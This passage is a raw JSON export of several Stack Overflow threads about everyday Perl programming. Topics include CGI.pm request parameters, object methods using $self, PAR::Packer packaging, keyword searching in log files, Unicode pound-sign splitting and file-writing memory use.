{"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485946876, "post_id": 41977839, "comment_id": 71133803, "body": "The point is that in a DELETE you would typically not have a body, because the URI is already enough to identify what you want to DELETE. At least if you want RESTful. But in general that also makes sense. What kind of data do you have in the body?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485947520, "post_id": 41977839, "comment_id": 71134206, "body": "<a href=\"http://stackoverflow.com/a/14850728/1331451\">stackoverflow.com/a/14850728/1331451</a> also looks like it could help. But that is even more monkey-patching."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485948988, "post_id": 41977839, "comment_id": 71135094, "body": "I&#39;m pretty sure you&#39;d have to change <a href=\"https://metacpan.org/source/LEEJO/CGI-4.35/lib/CGI.pm#L641\" rel=\"nofollow noreferrer\">this line</a> in your local CGI.pm. You could install one using local::lib and change it there. But monkey-patching that in seems too complicated."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485950425, "post_id": 41977839, "comment_id": 71136078, "body": "Ok thank you for your help. I&#39;m getting JSON via POST and PUT and thought that I can get JSON via DELETE too. So maybe I have to think about my service and how it (should) work. Thanks!"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485950571, "post_id": 41977839, "comment_id": 71136166, "body": "Typically a DELETE would work on something like <code>DELETE &#47;resource&#47;&lt;id&gt;</code>. That&#39;s straight forward just like GET. Both GET and DELETE don&#39;t need to take data in CRUD. They can have a query string though."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485952379, "post_id": 41977839, "comment_id": 71137369, "body": "Ahhh ok thanks! If I send the parameters like in GET (i.e. p=test) and do in Perl CGI-&gt;new()-&gt;param(&#39;p&#39;) than I get &#39;test&#39;. Thank you !!"}, {"owner": {"reputation": 2092, "user_id": 2678168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd5a048ca5e77e9683d0197b5455b3a9?s=128&d=identicon&r=PG&f=1", "display_name": "Georg Mavridis", "link": "https://stackoverflow.com/users/2678168/georg-mavridis"}, "edited": false, "score": 0, "creation_date": 1485954848, "post_id": 41977839, "comment_id": 71138988, "body": "6 minutes worth watching about CGI.pm  <a href=\"https://www.youtube.com/watch?v=jKOqtRMT85s\" rel=\"nofollow noreferrer\">youtube.com/watch?v=jKOqtRMT85s</a>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "edited": false, "score": 0, "creation_date": 1485957816, "post_id": 41977839, "comment_id": 71141065, "body": "Yes but I run it under Apache2 mod_perl and I didn&#39;t get runnin Mojolicious so I decided to use CGI for the Parameters"}], "owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 550, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1485969687, "creation_date": 1485946232, "question_id": 41977839, "link": "https://stackoverflow.com/questions/41977839/cgi-http-delete-parameters", "title": "CGI http delete parameters?", "body": "<p>In my App I cant use Frameworks like Mojo or Dancer or so on.</p>\n\n<p>I have to check for the request method by</p>\n\n<pre><code>CGI-&gt;new()-&gt;request_method\n</code></pre>\n\n<p>And I know I can get the Parameters from POST or PUT by</p>\n\n<pre><code>CGI-&gt;new()-&gt;param('POSTDATA') # OR 'PUTDATA'\n</code></pre>\n\n<p>I have to this because the data which I get is JSON with header=application/json</p>\n\n<p>But what can I do when I have da DELETE-Request?</p>\n\n<pre><code>CGI-&gt;new()-&gt;request_method eq 'DELETE'\n</code></pre>\n\n<p>works. But what about the params?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 4, "creation_date": 1485940958, "post_id": 41975903, "comment_id": 71129804, "body": "You are missing a curly bracket at the end of the sub <code>getJ</code>. Show us some real code on which you actually saw your problem. Also, I doubt you gave us the complete error message (it probably ends with <i>on an undefined value</i>)."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1485942927, "post_id": 41975903, "comment_id": 71131108, "body": "You should start indenting your code properly. It&#39;s hard to read. You also seem to have mixed OOP code and normal functions in the same package. If <code>sub dbconnect</code> is defined in that package it should be a method and also be called with <code>$self</code>. If it&#39;s imported, you shouldn&#39;t import it, but use the fully qualified name including the package because otherwise it will be available as a method on your object later. You should also include a <code>$class</code> (which is like <code>$self</code>, but holds the package name) in <code>sub new</code> and then <code>bless</code> into that class or you will be unable to subclass later."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485942998, "post_id": 41975903, "comment_id": 71131140, "body": "Consider posting your actual full code (or a working subset that you feel comfortable sharing publicly on the internet) on <a href=\"https://codereview.stackexchange.com\">Code Review</a> in the Perl tag and we&#39;ll give you feedback about your style and tell you how you can improve your code."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "edited": false, "score": 0, "creation_date": 1485944414, "post_id": 41975903, "comment_id": 71132061, "body": "Ok thanks. But this is my full code. In the sub dbconnect I only do $self-&gt;{&#39;orcl&#39;} = AnotherPackage::Orcl-&gt;new(schema, user, db, ....) But you helped me a lot. I think I now understand a bit more how to write Perl OOP. It is a bit hard for me because I programmed the last time in 2010 with php and not OOP."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "edited": false, "score": 2, "creation_date": 1485942103, "post_id": 41976019, "comment_id": 71130577, "body": "simbabque you are my hero the last days! It works and with your help I understand Perl even more! Thanks!"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 1, "last_activity_date": 1485941269, "last_edit_date": 1485941269, "creation_date": 1485940887, "answer_id": 41976019, "question_id": 41975903, "link": "https://stackoverflow.com/questions/41975903/perl-self-in-different-subs/41976019#41976019", "title": "Perl $self in different subs", "body": "<blockquote>\n  <p>Can't call method \"functionToFetchRow\" on an undefined value</p>\n</blockquote>\n\n<p>This error message tells you that <code>$self</code> is <code>undef</code>.</p>\n\n<p>You need to pass <code>$self</code> to <code>anotherSub</code> or it doesn't know about it. To do that, use the method syntax.</p>\n\n<pre><code>if($requestmethod eq 'POST') {\n    my $testvar = $self-&gt;anotherSub();\n}\n</code></pre>\n\n<p>Perl will automatically pass along <code>$self</code> as the first argument to <code>anotherSub</code> if it's called like that. This is how oject orientation works in Perl.</p>\n\n<p>You are already using the exact same thing when you do <code>$self-&gt;{'cgi'}-&gt;request_method</code> and <code>$self-&gt;{'orcl'}-&gt;functionToFetchRow()</code>. In both cases, the keys inside of <code>$self</code> (which is really just a hash reference) contain objects, and the <code>-&gt;method</code> calls the method on those objects, passing the objects themselves along as the first argument.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 117, "favorite_count": 0, "accepted_answer_id": 41976019, "answer_count": 1, "score": 2, "last_activity_date": 1485963923, "creation_date": 1485940465, "last_edit_date": 1485963923, "question_id": 41975903, "link": "https://stackoverflow.com/questions/41975903/perl-self-in-different-subs", "title": "Perl $self in different subs", "body": "<p>I've got the following structure in my Perl App</p>\n\n<pre><code>sub new {                                   \n    my $self = {};\n    $self-&gt;{'orcl'} = undef;\n    $self-&gt;{'cgi'} = CGI-&gt;new();\n    bless $self;\n    return $self;\n}\n\nsub getJ {\n    my $self = shift;\n    my $requestmethod = $self-&gt;{'cgi'}-&gt;request_method;\n    $self-&gt;{'orcl'} = dbconnect();\n    if($requestmethod eq 'POST') {\n        my $testvar = anotherSub();\n    }\n\nsub anotherSub {\n    my $self = shift;\n    my $sth = $self-&gt;{'orcl'}-&gt;functionToFetchRow();\n}\n</code></pre>\n\n<p>In the sub \"dbconnect\" the connection to the Database is opened.\nSo my problem is now, that I get the Error \"Can't call method \"functionToFetchRow()\"\"</p>\n\n<p>If I do </p>\n\n<pre><code>$self-&gt;{'orcl'} = dbconnect();\n</code></pre>\n\n<p>In the sub \"anotherSub\" it works perfect. But I want to open the connection to the Database only once and not in every Sub where I need it.</p>\n\n<p>So wheres my fault here?</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 46, "user_id": 691584, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0fb1ddfe07aa4245fa68c200c6f388d1?s=128&d=identicon&r=PG", "display_name": "Mohan Gutta", "link": "https://stackoverflow.com/users/691584/mohan-gutta"}, "is_accepted": false, "score": 0, "last_activity_date": 1485941005, "creation_date": 1485941005, "answer_id": 41976056, "question_id": 41974792, "link": "https://stackoverflow.com/questions/41974792/including-modules-in-a-perl-exe-generated-with-parpacker/41976056#41976056", "title": "Including modules in a Perl exe generated with PAR::Packer", "body": "<p>You can use <code>-a</code> or <code>--addfile=FILE|DIR</code> options of pp utility.</p>\n\n<p>example usage:</p>\n\n<pre><code>pp -a /path/to/your/include/dir out.exe hello\n</code></pre>\n\n<p>Please look for other pp options here <a href=\"http://metacpan.org/pod/pp\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/pp</a></p>\n"}], "owner": {"reputation": 669, "user_id": 5709891, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/d02aec741e53d5f3f97de2c9e317342a?s=128&d=identicon&r=PG&f=1", "display_name": "Ganesh", "link": "https://stackoverflow.com/users/5709891/ganesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 96, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485941005, "creation_date": 1485936686, "last_edit_date": 1485936765, "question_id": 41974792, "link": "https://stackoverflow.com/questions/41974792/including-modules-in-a-perl-exe-generated-with-parpacker", "title": "Including modules in a Perl exe generated with PAR::Packer", "body": "<pre><code>&gt; test_dir\n&gt;        |_test.pl\n&gt;        |_modules_dir\n&gt;                    |_config.pm\n&gt;          |_helper.pm\n&gt;          |_mech.pm\n</code></pre>\n\n<p>I want to make .exe file I already installed \"PAR::Packer\" and it working fine. I tested a temporary script(check.pl) using this command \"pp -o check.exe check.pl\"</p>\n\n<p>I want to make .exe but also attach the modules_dir, which command I use?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1485933450, "post_id": 41972868, "comment_id": 71125860, "body": "And what is the problem? Do you get an error, or does your code do something you don&#39;t want and you don&#39;t know why? Please be specific. You can <a href=\"https://stackoverflow.com/posts/41972868/edit\">edit</a> your question and add details."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1486021796, "post_id": 41977062, "comment_id": 71170118, "body": "Actually It was a typo to miss {"}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1486021836, "post_id": 41977062, "comment_id": 71170138, "body": "regarding () In the expression I have added them now .. thanks"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1485943998, "creation_date": 1485943998, "answer_id": 41977062, "question_id": 41972868, "link": "https://stackoverflow.com/questions/41972868/how-to-get-a-comment-printed-for-each-line-of-text-that-matches-within-a-file/41977062#41977062", "title": "How to get a comment printed for each line of text that matches within a file?", "body": "<p>Your example code has mismatched braces <code>{ ... }</code> and won't compile.</p>\n\n<p>If you were to add another closing brace to the end of your code then it would compile, but the line</p>\n\n<pre><code> $kw =~ m/\\((.*)\\)/;\n</code></pre>\n\n<p>will never succeed since there are no parentheses anywhere in <code>expressions.txt</code>. If a match has not succeeded then the value of <code>$1</code> will be retained from the most recently successful regex match operation</p>\n\n<p>You are also trying to search the lines from the files against the whole of the lines retrieved from <code>expressions.txt</code>, when you should be splitting those lines into keywords and their corresponding comments</p>\n"}, {"comments": [{"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1486030279, "post_id": 41979879, "comment_id": 71175223, "body": "It worked fine now .. just added the complete code above also what If I want to print the out put to a file ..here are multiple Printf"}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1486113615, "post_id": 41979879, "comment_id": 71215558, "body": "Just a small doubt .. how can I let me keywords to search In a order rather than In random order.. Like if there are keywords in my text file Hello World Bye..and In all the files I want to start with Hello followed by World and then by Bye .."}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": false, "score": 0, "last_activity_date": 1485953425, "last_edit_date": 1495541804, "creation_date": 1485952213, "answer_id": 41979879, "question_id": 41972868, "link": "https://stackoverflow.com/questions/41972868/how-to-get-a-comment-printed-for-each-line-of-text-that-matches-within-a-file/41979879#41979879", "title": "How to get a comment printed for each line of text that matches within a file?", "body": "<p>This seems to be the followup for this <a href=\"https://stackoverflow.com/questions/41934916/perl-how-to-search-a-indefinite-list-of-keywords-from-a-list-of-files-in-a-fol/41937591#41937591\">answer</a> of another question of you. What I tried to suggest in the last paragraph would start after the first three lines of your code:</p>\n\n<pre><code># post-processing your keywords file\nmy $kwhashref = {\n  map {\n    /^(.*?)(#.*?#)*$/;\n    defined($2) ? ($1 =&gt; $2) : ( $1 =&gt; undef )\n  } @keywords\n}; \n</code></pre>\n\n<p>Now you have the keywords in a hashref containing the actual keywords to search for as keys, and comments as values, if they exists (using your <code>#comment#</code> at the end of line syntax here).</p>\n\n<p>Your keyword loop would now have to use <code>keys %$kwhashref</code> and you now can additionally print the comment in the inner loop, converted like shown in the answer I linked. The additional print:</p>\n\n<pre><code>print $kwhashref-&gt;{$kw}.\"\\n\" if defined($kwhashref-&gt;{$kw}); # only print if comment defined\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 41977062, "answer_count": 2, "score": 0, "last_activity_date": 1486030212, "creation_date": 1485928614, "last_edit_date": 1486030212, "question_id": 41972868, "link": "https://stackoverflow.com/questions/41972868/how-to-get-a-comment-printed-for-each-line-of-text-that-matches-within-a-file", "title": "How to get a comment printed for each line of text that matches within a file?", "body": "<p>I am trying to match a keyword/text/line given in a file called <code>expressions.txt</code> from all files matching <code>*main_log</code>. When a match is found I want to print the comment for each line that matches.</p>\n\n<p>Is there any better way to get this printed?</p>\n\n<pre><code>expression.txt\nHello World ! # I want to print this comments#\nBye* #I want this to print when Bye Is match with main_log#\n:::\n:::\n</code></pre>\n\n<p>Below Is the code I used :</p>\n\n<pre><code>{\n    open( my $kw, '&lt;', 'expressions.txt' ) or die $!;\n    my @keywords = &lt;$kw&gt;;\n    chomp( @keywords ); # remove newlines at the end of keywords\n\n    # get list of files in current directory\n    my @files = grep { -f } ( &lt;*main_log&gt;, &lt;*Project&gt;, &lt;*properties&gt; );\n\n    # loop over each file to search keywords in\n    foreach my $file ( @files ) {\n\n        open( my $fh, '&lt;', $file ) or die $!;\n        my @content = &lt;$fh&gt;;\n        close( $fh );\n\n        my $l = 0;\n\n        foreach my $kw ( @keywords ) {\n\n            my $search = quotemeta( $kw ); # otherwise keyword is used as regex, not literally\n\n            #$kw =~ m/\\[(.*)\\]/;\n            $kw =~ m/\\((.*)\\)/;\n            my $temp = $1;\n            print \"$temp\\n\";\n\n            foreach ( @content ) { # go through every line for this keyword\n                $l++;\n                printf 'Found keyword %s in file %s, line %d:%s'.$/, $kw, $file, $l, $_ if /$search/;\n            }\n        }\n    }\n</code></pre>\n\n<p>I tried this code to print the comments mentioned within parentheses <code>(...)</code> but it is not printing in the fashion which I want like below:</p>\n\n<p>If the expression.txt contains</p>\n\n<pre><code>Hello World ! # I want to print this comments#\n</code></pre>\n\n<p>If <code>Hello World !</code> string is matched in my file called <code>main_log</code> then it should match only <code>Hello World!</code> from the <code>main_log</code> but print <code># I want to print this comments#</code> as a comment for user to understand the keyword.</p>\n\n<p>These keywords can be from any length or contains any character.</p>\n\n<p>It worked fine but just a little doubt on printing the required output Into a file though I have used perl -w Test.pl > my_output.txt command on command prompt not sure how can I use Inside the perl script Itself</p>\n\n<pre><code>open( my $kw, '&lt;', 'expressions.txt') or die $!;\nmy @keywords = &lt;$kw&gt;;\nchomp(@keywords); # remove newlines at the end of keywords\n\n\n# post-processing your keywords file\nmy $kwhashref = {\n  map {\n    /^(.*?)(#.*?#)*$/;\n    defined($2) ? ($1 =&gt; $2) : ( $1 =&gt; undef )\n  } @keywords\n}; \n\n\n# get list of files in current directory\nmy @files = grep { -f } (&lt;*main_log&gt;,&lt;*Project&gt;,&lt;*properties&gt;);\n\n\n# loop over each file to search keywords in\nforeach my $file (@files) {\n  open(my $fh, '&lt;', $file) or die $!;\n  my @content = &lt;$fh&gt;;\n  close($fh);\n  my $l = 0;\n  #foreach my $kw (@keywords) {\n\n  foreach my $kw (keys %$kwhashref) {\n    my $search = quotemeta($kw); # otherwise keyword is used as regex, not literally\n    #$kw =~ m/\\[(.*)\\]/;\n    #$kw =~ m/\\#(.*)\\#/;\n    #my $temp = $1;\n    #print \"$temp\\n\";\n\n    foreach (@content) { # go through every line for this keyword\n      $l++;\n      if (/$search/)\n      {\n\n      # only print if comment defined\n      print $kwhashref-&gt;{$kw}.\"\\n\" if defined($kwhashref-&gt;{$kw}) ;    \n      printf 'Found keyword %s in file %s, line %d:%s'.$/, $kw, $file, $l, $_\n      #printf '$output';\n\n      }\n\n\n    }\n  }\n}\n</code></pre>\n"}, {"tags": ["regex", "macos", "perl", "osx-elcapitan"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1485900957, "post_id": 41968429, "comment_id": 71115664, "body": "So you&#39;re reading this from a file? What is the encoding of the file?"}, {"owner": {"reputation": 933, "user_id": 425833, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/02fe63e5c700cfe8313ce56bf1a1dc15?s=128&d=identicon&r=PG", "display_name": "drw", "link": "https://stackoverflow.com/users/425833/drw"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485901306, "post_id": 41968429, "comment_id": 71115820, "body": "Western (ISO Latin 1)  but there is also some Russian text"}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 3, "creation_date": 1485903430, "post_id": 41968429, "comment_id": 71116614, "body": "If you&#39;re reading HTML, you should most probably use an HTML parser. Also, it&#39;s definitely not possible for a file to be in ISO-Latin-1 and contain Russian (Cyrillic) text, unless it uses character entities. So, again, what is the encoding of the file?"}, {"owner": {"reputation": 933, "user_id": 425833, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/02fe63e5c700cfe8313ce56bf1a1dc15?s=128&d=identicon&r=PG", "display_name": "drw", "link": "https://stackoverflow.com/users/425833/drw"}, "edited": false, "score": 0, "creation_date": 1485903758, "post_id": 41968429, "comment_id": 71116741, "body": "Seamonkey says windows-1252 but don&#39;t know how to read encoding on the mac. Now got Unicode to work in Perl (see below) but strange did not work directly."}], "answers": [{"tags": [], "owner": {"reputation": 933, "user_id": 425833, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/02fe63e5c700cfe8313ce56bf1a1dc15?s=128&d=identicon&r=PG", "display_name": "drw", "link": "https://stackoverflow.com/users/425833/drw"}, "is_accepted": false, "score": 1, "last_activity_date": 1485936184, "last_edit_date": 1485936184, "creation_date": 1485903434, "answer_id": 41969035, "question_id": 41968429, "link": "https://stackoverflow.com/questions/41968429/parsing-%c2%a3-in-perl-on-a-mac/41969035#41969035", "title": "parsing &#163; in Perl on a Mac", "body": "<p>One simple answer would be</p>\n\n<pre><code>@Line=split(\"\\N{U+00A3}\",$Hit);\n</code></pre>\n\n<p>where <code>\\N{U+00A3}</code> is the Unicode for <code>\u00a3</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 933, "user_id": 425833, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/02fe63e5c700cfe8313ce56bf1a1dc15?s=128&d=identicon&r=PG", "display_name": "drw", "link": "https://stackoverflow.com/users/425833/drw"}, "edited": false, "score": 0, "creation_date": 1485934290, "post_id": 41974146, "comment_id": 71126291, "body": "That works and is more readable than giving <code>&#163;</code> as <code>\\N{U+00A3}</code>!"}], "tags": [], "owner": {"reputation": 46, "user_id": 691584, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0fb1ddfe07aa4245fa68c200c6f388d1?s=128&d=identicon&r=PG", "display_name": "Mohan Gutta", "link": "https://stackoverflow.com/users/691584/mohan-gutta"}, "is_accepted": true, "score": 0, "last_activity_date": 1485933987, "creation_date": 1485933987, "answer_id": 41974146, "question_id": 41968429, "link": "https://stackoverflow.com/questions/41968429/parsing-%c2%a3-in-perl-on-a-mac/41974146#41974146", "title": "parsing &#163; in Perl on a Mac", "body": "<p>Please use utf8 pragma as that symbol is unicode character. here is the sample code.</p>\n\n<pre><code>use strict;\n\nuse utf8;\n\nmy $str = qq~&lt;a name=\"word1\u00a3word2\"&gt;~;\nmy ($first, $second) = split(\"\u00a3\", $str);\n\nprint \"$first  $second\\n\";\n</code></pre>\n"}], "owner": {"reputation": 933, "user_id": 425833, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/02fe63e5c700cfe8313ce56bf1a1dc15?s=128&d=identicon&r=PG", "display_name": "drw", "link": "https://stackoverflow.com/users/425833/drw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "accepted_answer_id": 41974146, "answer_count": 2, "score": 0, "last_activity_date": 1485936184, "creation_date": 1485900685, "question_id": 41968429, "link": "https://stackoverflow.com/questions/41968429/parsing-%c2%a3-in-perl-on-a-mac", "title": "parsing &#163; in Perl on a Mac", "body": "<p>I'm trying to parse a line containing a UK currency \u00a3 symbol using perl on a Mac running El Capitan but can't get it to parse. Ideally I would like to use it split a string </p>\n\n<p><code>@Line=split(\"\u00a3\",$Hit);</code></p>\n\n<p>but I can't even get regular expressions to work. Escaping does not work Is this a Mac character set problem? Listing on the terminal shows a ? in place of the \u00a3.</p>\n\n<p>The target text comes from named anchors in HTML written by Seamonkey's Composer:</p>\n\n<p><code>&lt;a name=\"word1\u00a3word2\"&gt;</code></p>\n"}, {"tags": ["perl", "memory-management"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1485899087, "post_id": 41968002, "comment_id": 71114857, "body": "This might be <a href=\"http://stackoverflow.com/questions/1242832/in-perl-how-can-i-release-memory-to-the-operating-system\">a duplicate</a>, but I really don&#39;t understand the question."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1485899087, "post_id": 41968002, "comment_id": 71114856, "body": "Can you update your question with the script? It should work."}, {"owner": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "edited": false, "score": 0, "creation_date": 1485901429, "post_id": 41968002, "comment_id": 71115851, "body": "Edited my question to add more details on the question. Hopefully it will explain the problem a lot clearer"}, {"owner": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "edited": false, "score": 0, "creation_date": 1485909424, "post_id": 41968002, "comment_id": 71118521, "body": "My bad, i fixed the syntax. So is this how Perl actually use memory for FILEHANDLE ? Is there an alternative not to exhaust the memory and write a huge file through Perl ?"}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1485909560, "post_id": 41968002, "comment_id": 71118562, "body": "&quot;One thing that is also really weird is that, after I terminate my script I look at my memory and it&#39;s still being taken by the files. And when I remove the files, it frees up my memory. I use free in linux to check my memory.&quot; I think you&#39;re seeing the OS&#39;s disk cache, here... or else you&#39;re writing to tmpfs."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 